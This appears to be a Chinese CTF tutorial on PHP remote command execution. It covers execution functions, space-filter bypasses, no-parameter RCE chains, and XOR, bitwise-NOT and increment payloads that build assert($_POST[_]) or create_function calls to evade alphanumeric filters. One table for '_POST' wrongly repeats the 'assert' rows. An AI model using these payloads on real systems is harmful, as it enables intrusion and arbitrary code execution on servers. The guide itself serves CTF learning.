---
title: "命令执行ctf解题思路"
date: "2026-11-02"
categories: ["ctf","RCE"]
tags: ["RCE","命令执行","无参数RCE","CTF"]
description: "整理命令执行类 CTF 题目的常见套路：PHP 里的文件读取与命令执行函数、远程代码执行、无字母数字 RCE、无参数 RCE、临时文件与 create_function 利用，以及空格过滤、关键字过滤、cat 绕过、无回显与时间盲注的应对手法。"
author: "Fan-SecLab"
aside: right
outline: [2, 3]
---

# 命令执行ctf解题思路

> 🎯 本文按「常见的php内置函数 → 读取文件的系统命令 → php中读取文件内容的函数 → php中命令执行函数 → **空格被过滤** → 远程代码执行 → 无参数RCE → 无字母数字RCE」的顺序整理，便于对照速查。

## 常见的php内置函数

### 读取文件的系统命令

| 命令                                 | 说明                                      |
|--------------------------------------|-------------------------------------------|
| `cat flag.php`                       | 标准读                                    |
| `tac flag.php`                       | 行倒序（最后一行先出）                    |
| `nl flag.php`                        | 带行号                                    |
| `head -c 200 flag.php` / `head -n 5` | 前 N 字节 / 前 N 行                       |
| `tail -c 200` / `tail -n 5`          | 后 N 字节 / 行                            |
| `sed -n '1,10p' flag.php`            | 打印指定行范围                            |
| `sed '' flag.php` / `awk 1 flag.php` | 整篇输出（cat 的纯替身）                  |
| `grep . flag.php` / `grep -v '^$'`   | 输出所有非空行                            |
| `sort flag.php` / `uniq` / `rev`     | 排序 / 去重 / 每行反转                    |
| `more` / `less` / `vi` / `nano`      | 分页/编辑器（**非交互环境易卡住，慎用**） |
| `base64 flag.php` / `base64 -w0`     | base64 输出（防丢字节）                   |
| `xxd` / `hexdump -C` / `od -c`       | 十六进制 / 八进制 dump                    |
| `strings flag.php`                   | 只提可打印字符串                          |
| `cp flag.php /dev/stdout`            | 走复制读（权限受限时有用）                |
| `dd if=flag.php`                     | 原样吐出                                  |
| `diff flag.php /dev/null`            | 差异输出，等于整篇                        |
| `wc -c` / `md5sum` / `file`          | 看大小、指纹、文件类型                    |

### php中读取文件内容的函数

| 函数                       | 直接输出 | 返回          | 效果                                                         | 用法                                                |
|----------------------------|----------|---------------|--------------------------------------------------------------|-----------------------------------------------------|
| `file_get_contents($f)`    | ❌       | 全文 `string` | 读全文，支持 `http://`、`php://filter`、`data://`，可带 `$offset`/`$maxlen` | `print_r(file_get_contents('flag.php'));`           |
| `readfile($f)`             | ✅       | 字节数        | 直接打印文件内容，无需 `echo`                                | `readfile('flag.php');`                             |
| `highlight_file($f)`       | ✅       | `true`        | 打印高亮源码（HTML 转义），看 php 源码首选                   | `highlight_file('flag.php');`                       |
| `show_source($f)`          | ✅       | `true`        | `highlight_file` 的别名                                      | `show_source('flag.php');`                          |
| `php_strip_whitespace($f)` | ❌       | `string`      | 返回去注释、去空白后的源码                                   | `print_r(php_strip_whitespace('index.php'));`       |
| `file($f)`                 | ❌       | 按行 `array`  | 按行读成数组，`FILE_IGNORE_NEW_LINES` 去换行                 | `print_r(file('flag.php', FILE_IGNORE_NEW_LINES));` |
| `fpassthru($h)`            | ✅       | 字节数        | 输出已打开句柄的内容                                         | `fpassthru(fopen('flag.php','r'));`                 |
| `readgzfile($f)`           | ✅       | 字节数        | 读 gz 并输出，普通文件也能读                                 | `readgzfile('flag.txt.gz');`                        |
| `gzfile($f)`               | ❌       | 按行 `array`  | 读 gz 返回按行数组，普通文件也能读                           | `print_r(gzfile('flag.php'));`                      |

### php中命令执行函数

| 函数                      | 效果                                 | 用法                                       |
|---------------------------|--------------------------------------|--------------------------------------------|
| `system()`                | 执行命令并直接输出结果               | `system('cat /flag');`                     |
| `exec()`                  | 执行命令，返回最后一行（不打印）     | `print_r(exec('ls -la'));`                 |
| `shell_exec()`            | 执行命令，返回全部输出字符串         | `echo shell_exec('ls');` ／ `echo `ls`;`   |
| `passthru()`              | 执行命令并原样输出                   | `passthru('cat /flag');`                   |
| `popen()` / `proc_open()` | 打开进程执行，需自己读流             | `$h=popen('id','r'); echo fread($h,1024);` |
| `assert()`                | 字符串当 PHP 代码执行（5.x/7.0-7.1） | `assert($_POST['c']);`                     |
| `eval`                    | 字符串当代码执行（语言结构）         | `eval($_POST['c']);`                       |
| `call_user_func()`        | 回调执行任意函数                     | `call_user_func('system','ls');`           |
| `create_function()`       | 造匿名函数，调用后执行               | `create_function('', $_POST['c'])();`      |
| `preg_replace()` + `/e`   | 替换内容当代码执行（<7.0）           | `preg_replace('/.*/e', $_POST['c'], '');`  |
| `include` / `require`     | 包含文件即执行                       | `include($_GET['f']);`                     |

### **空格被过滤**

```
cat${IFS}flag.php
cat$IFS$9flag.php
cat<flag.php          # 重定向当空格
cat<>flag.php
{cat,flag.php}        # bash 花括号展开
%09                   # Tab（URL 里）
```

## 远程代码执行

### 无参数RCE

**无参数 RCE（无参 RCE）** 是 PHP CTF 里的一类题目术语，指**代码执行点只允许调用“不带参数”的函数**，选手必须用一堆零参函数层层嵌套，间接地获得字符串或数组，最终实现读文件或执行命令。

它不是一种独立的漏洞类型。它的本质仍然是 `eval()` 或 `assert()` 这样的动态执行点，只不过执行环境加了一层“禁止传参”的过滤器，因此需要研究绕过手法。

**例题**：[GXYCTF2019]禁止套娃

```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp']))
{
if(';' === preg_replace('/[a-z_]+\((?R)?\)/', NULL, $_GET['exp'])) {
if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i',
$_GET['exp'])) {
// echo $_GET['exp'];
@eval($_GET['exp']);
}
else{
die("还差一点哦！");
}
}
else{
die("再好好想想！");
}
}
else{
die("还想读flag，臭弟弟！");
}
}
highlight_file(__FILE__);
?>
```

#### **代码分析**

1. ` if (!preg_match('/data|filter|php|phar/i', $_GET['exp']))`

`/xxx/`斜杠中间是正则匹配的内容

`/xxx/i `末尾的i表示不区分大小写

正则匹配，get传参的exp中不允许出现 `data filter php phar`这些伪协议，而且不区分大小写

2. `';' === preg_replace('/[a-z_]+\((?R)?\)/', NULL, $_GET['exp'])`

`/[a-z_]+\((?R)?\)/`正则匹配

`[a-z_]`：匹配小写字母、下划线 ,比如  show_source 、 scandir

`+` ：代表 前面这一类字符，至少出现1次，可以连续多个

`\(`:转义左括号

`\) `:转义右括号

`(?R)?` :递归,括号里面还能继续套这个规则

只有get传参的exp中出现符合正则匹配规则的字符，才可以被替换成NULL

只有最后只留下了一个`;`，才判断成功，进行命令执行

这个命令执行指令中不能出现参数，要不然就无法判断正确

**解题思路**

#### 问题1：如何获取到 `.`

1. **chr(46)**

**`scandir(.)`：能列出当前目录中所有文件，但是`.`并不在正则匹配的规则中，不能直接这样写**

`rand()`:生成随机数据

`chr()`:把ASCII数字码转换成对应的字符，`chr(46)`对应的就是 `.`

我们可以通过`chr(rand())`函数嵌套，1/256概率，每256次出现一次数字46，就可以得到`chr(46)`。

`chr()`:还会对里面的数字对256进行取余

`time`():生成一个时间戳,返回一从70/01/01到现在的秒数

`chr(time())`函数嵌套,由于`chr()`还会对里面的数字对256进行取余，也会得到`chr(46)`。

```
scandir(chr(rand()))
scandir(chr(time()))
```

`localtime`:返回一个时间数组

```php
$arr = localtime();
/*
[0] => 秒 (0~59)
[1] => 分
[2] => 时
[3] => 日
[4] => 月-1
[5] => 年份-00
*/
```

`localtime(time())`:拿到从70/01/01到现在的秒数后，把它变成一个记录秒，分，时，日，月，年的数组，这个2个函数要配合起来使用

![image-20261103141223459](/assets/images/rce/image-20261103141223459.png)

还有一个问题，`localtime(time())`返回的是一个数组，我们只想让他返回第一个数组元素秒的值，但是不能用数字参数去指定,我们可以用`current()`去指定第一个元素

```
操作数组:
end()- 将内部指针指向数组中的最后一个元素，并输出
next()将内部指针指向数组中的下一个元素，并输出
prev()-将内部指针指向数组中的上一个元素，并输出
reset()- 将内部指针指向数组中的第一个元素，并输出
each()-返回当前元素的键名和键值，并将内部指针向前移动
current()/pos()-默认返回数组第一个元素
```

```

echo(pos(localtime(time())));

scandir(pos(localtime(time())));
```

![image-20261103141501101](/assets/images/rce/image-20261103141501101.png)

2. **current(localeconv())**

`localeconv()`返回一个数组第一个元素一定是`.`的数组，推荐用这个

```
echo current(localeconv());
```

![image-20261103125613744](/assets/images/rce/image-20261103125613744.png)

```
var_dump(localeconv());
```

![image-20261103125014360](/assets/images/rce/image-20261103125014360.png)

3. **phpversion()**

php7 5.6也可以

```
print_r(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))));
Array
(
[0] => .
[1] => ..
[2] => phpinfo.php
[3] => test.php
)
```

![image-20261103200309272](/assets/images/rce/image-20261103200309272.png)

```
打印当前目录下最后一个文件名字
print_r(end(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))));
```

![image-20261103200443144](/assets/images/rce/image-20261103200443144.png)

```
返回 .
chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))));
```

```
展示当前目录下所有文件
scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))));
```

4. **crypt()**

```
返回 .
chr(ord(hebrevc(crypt(phpversion()))))
```

```
展示当前目录下所有文件，可能要尝试很多次
scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))
```

```
打印出当前目录下所有文件，可能要尝试很多次
print_t(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))));
```

```
读取当前目录下最后一个文件的内容，可能要尝试很多次
readfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));
```

#### 问题2：如何从数组中取出flag.php

1. 如果flag.php在最后一个，直接用**end()**取出即可。

2. **array_reverse()**

仅限于flag.php在数组的倒数第二个位置这种情况下。

**`array_reverse()`**:将数组的顺序颠倒，倒数第二个变成了第二个，再用`netx()`去获取第二个文件

```
打印出倒数第二个文件的文件名
print_r(next(array_reverse(scandir(pos(localeconv())))));
```

![image-20261103202120390](/assets/images/rce/image-20261103202120390.png)

3. **array_rand(array_flip())随机获取**

**随机取出数组里的一个元素值**

```
scandir得到：[0=>".",1=>"..",2=>"index.php",3=>"flag.php"]
array_flip之后：[ "."=>0 , ".."=>1 , "index.php"=>2 , "flag.php"=>3 ]

array_flip() :交换数组的「键」和「值」,原来的值（文件名）变成键名！

array_rand(数组) :从数组里随机拿一个键名返回（不是值！）
```

```
执行流程：

1.  scandir()  → 索引数组  [0=>".",1=>"..",2=>"index.php",3=>"flag.php"]

2.  array_flip()  → 文件名跑到键的位置： ["flag.php"=>3]

3.  array_rand()  → 随机返回一个键，也就是文件名！
```

```
echo(array_rand(array_flip(scandir(pos(localeconv())))));
```

![image-20261103202601222](/assets/images/rce/image-20261103202601222.png)

![image-20261103202643290](/assets/images/rce/image-20261103202643290.png)

每次的结果都不同

4. **session**

```
print_r(session_id(session_start()));
```

- **`session_start() `**
  开启session会话，返回布尔值  true/false （⚠️但是！传给session_id的时候会被忽略， session_id() 不带参数时只是去读取当前sessionid）

> **重点：不是拿session_start的返回值， session_id() 无参就是读取当前会话ID字符串**

- **session_id() **
  读取Cookie里 PHPSESSID 的值！这个字符串我们攻击者完全可控

- **print_r() **
  把读到的sessionid打印输出

这个是没有修改cookie值的

![image-20261103205247061](/assets/images/rce/image-20261103205247061.png)

我们指定cookie的值时flag.php

![image-20261103205633372](/assets/images/rce/image-20261103205633372.png)

5. **Getallheaders()**

```
current(getallheaders()) //适用于apache服务器 php7以上(本题被过滤)
print_r(current(apache_request_headers())); //nginx和apache都可以使用 php7以上
```

你自己在请求包里面，额外增加一条自定义请求头，值写flag.php，然后用 end()/current() 取出这个头的值，交给readfile读取

我们自定义一个请求头键值对

Cookie
PHPSESSIONID=flag.php

那么页面就会打印出请求头的值

![image-20261103210628249](/assets/images/rce/image-20261103210628249.png)

`current(apache_request_headers())`这个和上面那个效果一样，apache,nginx都可以用。

6. **get_defined_vars()**

```
//返回一个包含所有已定义变量的数组
print_r(end(pos(get_defined_vars()))); //get请求
print_r(end(next(get_defined_vars()))); //post请求
```

- **`get_defined_vars() `**
  返回当前作用域全部已定义变量的大数组，里面包含 $_GET 、 $_POST 、 $_COOKIE 、 $_SERVER 这些超全局变量。

- **`pos(...)  =  current(...) `**
  取出这个大数组第一个元素，一般就是  $_GET （GET参数组成的关联数组）✅

- **`pos(get_defined_vars())` ** = 拿到  $_GET  数组！
- **end($_GET) **
  把数组指针移到 $_**GET 的最后一个参数的值，也就是你url上传入参数的值！

如图获取到了上传到的 exp 参数的值

![image-20261103211915169](/assets/images/rce/image-20261103211915169.png)

- **`next()`**

  取出第二个数组元素，一般就是 $_POST

- **`next(get_defined_vars())` ** = 拿到  $_POST  数组！

如图获取到了 POST 传参参数的值

![image-20261103212813126](/assets/images/rce/image-20261103212813126.png)

#### 问题3：如何查看flag.php

1. **文件读取**

文件名要用引号括起来

| 函数                               | 作用                     |
|------------------------------------|--------------------------|
| var_dump(file_get_contents($file)) | 读取文件内容到字符串     |
| `show_source($file)`               | 别名：`highlight_file()` |
| `highlight_file($file)`            | 高亮输出源码             |
| `readfile($file)`                  | 读取并输出文件           |

2. **命令执行**

| 命令                        | 用法                                        | 特点                       |
|-----------------------------|---------------------------------------------|----------------------------|
| `tac flag.php`              | 反向输出（cat 反过来）                      | 高频替补，很多过滤漏 ban   |
| `nl flag.php`               | 带行号输出                                  | 直接出文本                 |
| `head flag.php`             | 默认前 10 行；`head -n 999 flag.php` 全读   |                            |
| `tail flag.php`             | 默认最后 10 行；`tail -n 999 flag.php` 全读 |                            |
| `od -A n -c flag.php`       | od 八进制转储，`-c`打印字符                 | 二进制文件也能读，会带空格 |
| `xxd flag.php`              | 十六进制 dump                               | 拿到后自己解码             |
| `hexdump -C flag.php`       | 十六进制 + ascii                            | 和 xxd 同类                |
| `sed -n '1,$p' flag.php`    | sed 打印全部行                              | 正则过滤场景好用           |
| `awk '{print $0}' flag.php` | awk 输出每行                                | 很多 ban 名单不 banawk     |
| `grep "." flag.php`         | 匹配任意字符，输出全部                      | 极简 payload               |
| `sort flag.php`             | 排序输出文本                                | 文本 flag 一般不影响       |
| `uniq flag.php`             | 去重输出                                    | flag 单行时可用            |
| `pg flag.php`               | 分页器，输出到 stdout 等价 cat              | 冷门                       |

## 无字母数字RCE

例题：

```php
<?php
highlight_file(__FILE__);
$code = $_GET['code'];
if(preg_match("/[A-Za-z0-9]+/",$code)){
die("hacker!");
}
@eval($code);
?>
```

```
"/[A-Za-z0-9]+/"
```

增则匹配，code中间不能包含大写字母、小写字母以及数字

我们可以利用 ASCII 编码绕过

> ASCII是不可见字符，不属于字母、数字，正则 [A-Za-z0-9] 匹配不到，不会触发die

### php5

#### 异或运算

✅核心：相同为0，不同为1（二进制位运算）

```
3 ^ 5
3 → 011
5 → 101
按位两两异或：
0 ^ 1 =1
1 ^ 0 =1
1 ^ 1 =0
结果 = 110 → 也就是十进制 6
```

```
echo chr(0x01 ^ 0x60); 输出 a
```

![image-20261105193517464](/assets/images/rce/image-20261105193517464.png)

```
echo chr(0x01^0x60).chr(0x13^0x60).chr(0x13^0x60).chr(0x05^0x60).chr(0x12^0x60).chr(0x14^0x60);
输出 assert
```

![image-20261105193624112](/assets/images/rce/image-20261105193624112.png)

我们让`$_ = assert;` `_` 没有被过滤

php5版本下 `assert` 可以进行命令执行

```cmd
assert("system('id');");
system后面可以跟命令执行
whoami
ls
cat flag.php
pwd
```

```php
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); //$_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
?>
最终返回assert($_POST[_]);
```

payload：

```php
?code=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);
```

```
我们通过post传参，给 _ 去传参，_=system('cat flag.php');
由于题目没有对post的传参里面的参数进行过滤,post里面可以随便写
那么代码就会变成assert("system('cat flag.php');");
```

![image-20261105221630493](/assets/images/rce/image-20261105221630493.png)

#### **取反**

```php
<?php
$__=('>'>'<')+('>'>'<');
$_=$__/$__;
$____='';
$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~
($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~
($___{$_});$___="始";$____.=~($___{$__});
$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~
($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});
$_=$$_____;
$____($_[$__]);
?>
```

---

```php
$__=('>'>'<')+('>'>'<');
```

```bash
>  的ASCII=62， <  的ASCII=60
'>' > '<'  → 62>60 成立，返回  true
PHP做算术运算时  true == 1
所以：
true + true = 1 + 1 = 2
$__ = 2
```

```php
$_=$__/$__;
也就是  $_ = 2 / 2
$_ = 1
```

```php
$____='';
空字符串，用来拼接最终函数名
```

```php
$___="瞰";$____.=~($___{$_});
$___="和";$____.=~($___{$__});
$___="和";$____.=~($___{$__});
$___="的";$____.=~($___{$_});
$___="半";$____.=~($___{$_});
$___="始";$____.=~($___{$__});
```

```bash
$___{$_}  →  $___{1} ，取这个汉字字符串下标为1的字节

$___{$__}  →  $___{2} ，取下标为2的字节

~(字节) ：按位取反得到目标字符,取反就是把字符变成二进制编码，然后1变成0，1变成0

.=  不断拼接，最后 $____ 拼接完 = "assert"
```

| 汉字 | UTF8三字节十六进制 | 字节二进制                                | 取出位置 | 取出字节二进制 | ~按位取反后二进制 | 取反后十进制 | 得到字符 |
|------|--------------------|-------------------------------------------|----------|----------------|-------------------|--------------|----------|
| 瞰   | E7,9E,B0           | E7=11100111<br>9E=10011110<br>B0=10110000 | [1] 9E   | 10011110       | 01100001          | 97           | **a**    |
| 和   | E5,92,8C           | E5=11100101<br>92=10010010<br>8C=10001100 | [2] 8C   | 10001100       | 01110011          | 115          | **s**    |
| 和   | E5,92,8C           | E5=11100101<br>92=10010010<br>8C=10001100 | [2] 8C   | 10001100       | 01110011          | 115          | **s**    |
| 的   | E7,9A,84           | E7=11100111<br>9A=10011010<br>84=10000100 | [1] 9A   | 10011010       | 01100101          | 101          | **e**    |
| 半   | E5,8D,8A           | E5=11100101<br>8D=10001101<br>8A=10001010 | [1] 8D   | 10001101       | 01110010          | 114          | **r**    |
| 始   | E5,A7,8B           | E5=11100101<br>A7=10100111<br>8B=10001011 | [2] 8B   | 10001011       | 01110100          | 116          | **t**    |

```php
$_____='_';
$___="俯";$_____.=~($___{$__});
$___="瞰";$_____.=~($___{$__});
$___="次";$_____.=~($___{$_});
$___="站";$_____.=~($___{$_});
```

```bash
$_____ 初始值是 '_' ，后面继续拼接字符，最后 $_____ = "_POST"
```

| 汉字 | UTF8三字节十六进制 | 字节二进制                                | 取出位置 | 取出字节二进制 | ~按位取反后二进制 | 取反后十进制 | 得到字符 |
|------|--------------------|-------------------------------------------|----------|----------------|-------------------|--------------|----------|
| 瞰   | E7,9E,B0           | E7=11100111<br>9E=10011110<br>B0=10110000 | [1] 9E   | 10011110       | 01100001          | 97           | **a**    |
| 和   | E5,92,8C           | E5=11100101<br>92=10010010<br>8C=10001100 | [2] 8C   | 10001100       | 01110011          | 115          | **s**    |
| 和   | E5,92,8C           | E5=11100101<br>92=10010010<br>8C=10001100 | [2] 8C   | 10001100       | 01110011          | 115          | **s**    |
| 的   | E7,9A,84           | E7=11100111<br>9A=10011010<br>84=10000100 | [1] 9A   | 10011010       | 01100101          | 101          | **e**    |
| 半   | E5,8D,8A           | E5=11100101<br>8D=10001101<br>8A=10001010 | [1] 8D   | 10001101       | 01110010          | 114          | **r**    |
| 始   | E5,A7,8B           | E5=11100101<br>A7=10100111<br>8B=10001011 | [2] 8B   | 10001011       | 01110100          | 116          | **t**    |

还原最终效果：

```
assert($_POST[2]);
```

payload

```
?code=%24__%3D('%3E'%3E'%3C')%2B('%3E'%3E'%3C')%3B%24_%3D%24__%2F%24__%3B%24____%3D''%
3B%24___%3D%22%E7%9E%B0%22%3B%24____.%3D~
(%24___%7B%24_%7D)%3B%24___%3D%22%E5%92%8C%22%3B%24____.%3D~
(%24___%7B%24__%7D)%3B%24___%3D%22%E5%92%8C%22%3B%24____.%3D~
(%24___%7B%24__%7D)%3B%24___%3D%22%E7%9A%84%22%3B%24____.%3D~
(%24___%7B%24_%7D)%3B%24___%3D%22%E5%8D%8A%22%3B%24____.%3D~
(%24___%7B%24_%7D)%3B%24___%3D%22%E5%A7%8B%22%3B%24____.%3D~
(%24___%7B%24__%7D)%3B%24_____%3D'_'%3B%24___%3D%22%E4%BF%AF%22%3B%24_____.%3D~
(%24___%7B%24__%7D)%3B%24___%3D%22%E7%9E%B0%22%3B%24_____.%3D~
(%24___%7B%24__%7D)%3B%24___%3D%22%E6%AC%A1%22%3B%24_____.%3D~
(%24___%7B%24_%7D)%3B%24___%3D%22%E7%AB%99%22%3B%24_____.%3D~
(%24___%7B%24_%7D)%3B%24_%3D%24%24_____%3B%24____(%24_%5B%24__%5D)%3B
```

![image-20261105223910281](/assets/images/rce/image-20261105223910281.png)

#### **递增运算**

```php
$a = "a";
$a++;
echo $a; //会打印b，a-- 不可用，只能加不能减
```

![image-20261105232636530](/assets/images/rce/image-20261105232636530.png)

```
//大小写不敏感
assert(phpinfo());
AssErt(phpinfo()); //都能执行成功
```

```php
$_ = @"".[];
echo $_["1" == "2"];
// @  是PHP错误抑制符，用来屏蔽警告信息
// .  是字符串连接，数组和字符串拼接的时候，数组会被强制转成字符串，结果为字符串  "Array" ，同时本来会抛出notice警告，但被 @ 压制了,所以 $_ = "Array"。

// "1" == "2"
// 两个字符串比较， 1不等于2 ，返回布尔值  false
PHP数组/字符串取下标时，布尔 false 会转换成整数 0,就变成了 $_[0] ,取到数组的第一个元素就是A
```

**原理**：利用数组转字符串得到 "Array" 取出首字符 A ，再依靠PHP字母自增  $a++  推导出其他字母，拼出  assert  和  _POST。

payload:

```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;
$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;
$_=$$____;
$___($_[_]); // assert($_POST[_]);
```

```php
?code=$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$___.=$__;$___.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$___.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$___.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$___.=$__;$____='_';$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$____.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$____.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$____.=$__;$__=$_;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$__%2B%2B;$____.=$__;$_=$$____;$___($_[_]);
```

### php7

#### `$a() `: PHP可变函数

**可变函数**：PHP会读取变量 $a 里面保存的字符串，把这个字符串当成函数名来调用执行,PHP5 / PHP7 / PHP8 全都支持，是很老的语法

```php
$a='phpinfo';
$a();
//等价于直接写 phpinfo();
```

![image-20261107231628261](/assets/images/rce/image-20261107231628261.png)

#### (表达式)(); //php7特有

`("phpinfo")(); `

(表达式)() ：PHP7修改了运算符优先级，允许任意可以得到函数字符串的表达式外面套一层括号，然后后面直接写 () 调用函数。
("phpinfo") 本身就是一个表达式，求值得到字符串 phpinfo ，再接 () 执行。

7.2 起 assert() 不再把字符串当代码执行，可以用 `create_function('空',命令)` 替代

![image-20261107232508495](/assets/images/rce/image-20261107232508495.png)

#### 取反

```php
<?php
$a ="phpinfo";
echo "~(";
for($i = 0; $i < strlen($a); $i++){
echo "%".bin2hex(~$a[$i]);
}
echo ")";
?>
```

![image-20261107233612433](/assets/images/rce/image-20261107233612433.png)

```
~(%8f%97%8f%96%91%99%90)
```

- `~`  按位取反运算符,拿到这个字符的ASCII码，转成二进制，0变1，1变0
- `~$a[$i]`  = 取出这个字符，对它的ASCII码做按位取反运算
- bin2hex()  是PHP内置函数,把原始二进制字节，转换成十六进制字符串
- `bin2hex(~$a[$i]);` 取出字符串里的单个字符，先做按位取反，再把取反后的字节转成十六进制文本，用来拼出%xx形式的URL编码

**攻击的完整流程**

1. 本地生成脚本 取出目标字符串每个字符 → 拿到ASCII码 → 按位取反 → 转为十六进制 → 拼接上 % ，生成`~(%99%93%9e%98%d1%8f%97%8f)`

2. 浏览器提交、靶机接收参数,浏览器把 %xx 传给PHP，PHP的$_GET自动URL解码： %99  → 原始字节 0x99  ,是二进制字，不属于字母、数字， preg_match 正则匹配不到，成功绕过检测

3. 然后我们利用php的(表达式)(); 这个特性，就可以实现命令执行

  ```
  ?code=(~(%8f%97%8f%96%91%99%90))();
  ```

![image-20261108000850366](/assets/images/rce/image-20261108000850366.png)

**更厉害的攻击脚本**

```php
<?php
$a = "create_function";          // ← 只放函数名
echo '$_=~(';                    // ← 结构手写
for ($i = 0; $i < strlen($a); $i++) echo "%" . bin2hex(~$a[$i]);
echo ')';

echo ';$__=~(';
$b = "_POST";                    // ← 只放超全局名
for ($i = 0; $i < strlen($b); $i++) echo "%" . bin2hex(~$b[$i]);
echo ');$___=$$__;$____=$_(%27%27,$___[_]);$____();';   // ← 后面全是结构
```

输出

```php
$_=~(%9c%8d%9a%9e%8b%9a%a0%99%8a%91%9c%8b%96%90%91);$__=~(%a0%af%b0%ac%ab);$___=$$__;$____=$_(%27%27,$___[_]);$____();
```

url解码

```php
$_  = "create_function";
$__ = "_POST";
$___ = $$__;                            // $___ = $_POST,先取 $__ 的值 "_POST"，再把这个字符串当变量名去取 → 等价于 $_POST。
$____ = $_('', $___[_]);                // create_function('', $_POST['_'])
$____();                                // 调用，执行 body 里的代码
```

最后再用 post 传参

```
_=phpinfo();
```

![image-20261108004302438](/assets/images/rce/image-20261108004302438.png)

#### 异或运算

```php
<?php
$a="flag.php";
for($i=0; $i < strlen($a); $i++){
echo "%".dechex(ord($a[$i])^0xff);
}
echo "^";
for($i=0; $i < strlen($a); $i++){
echo "%ff";
}
?>
```

- `ord($a[$i]) ^ 0xff`:

> ord() ：拿到这个字符的ASCII十进制数字。
>
> ^ 异或
>
> 0xff = 255 （二进制8个1： 11111111 ）,一个8位数字异或0xff = 等价于8位按位取反！
>
> x ^ 0xff  =  ~x & 0xff ，两种写法效果完全相同，都是只做8位取反

